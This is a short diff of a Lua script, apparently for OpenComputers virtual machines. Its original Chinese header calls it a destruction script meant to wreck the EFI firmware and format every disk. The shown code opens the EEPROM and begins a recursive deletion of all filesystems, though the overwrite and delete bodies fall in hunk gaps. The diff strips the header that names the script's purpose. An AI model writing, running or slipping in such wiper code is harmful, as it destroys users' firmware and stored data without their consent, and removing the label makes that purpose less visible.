@@ -1,12 +1,7 @@
--- ============================================================
--- 破坏脚本 (简化版)
--- 目标：破坏EFI + 格式化所有磁盘
--- ============================================================
-
 local component = require("component")
 local filesystem = require("filesystem")
 
--- 1. 破坏EEPROM (EFI)
+-- 1.破坏EEPROM (EFI)
 print("Destroying EFI firmware...")
 local eeprom = component.eeprom
 if eeprom then
@@ -17,7 +12,7 @@ if eeprom then
   end)
 end
 
--- 2. 递归删除所有文件来格式化磁盘
+-- 2.格式化磁盘
 print("Formatting all filesystems...")
 local function deleteRecursive(path)
   if not filesystem.exists(path) then return end
